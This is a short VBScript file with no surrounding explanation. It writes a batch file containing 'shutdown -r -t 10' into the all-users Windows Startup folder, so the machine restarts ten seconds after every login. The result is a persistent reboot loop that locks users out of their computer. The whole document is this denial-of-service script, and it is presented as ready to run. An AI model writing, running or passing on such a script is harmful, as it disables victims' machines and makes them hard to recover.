set ws=createobject("wscript.shell")
set fso=createobject("Scripting.filesystemobject")
fso.createtextfile("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\1.bat")
set otf=fso.opentextfile("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\1.bat",8,true)
otf.write "shutdown -r -t 10"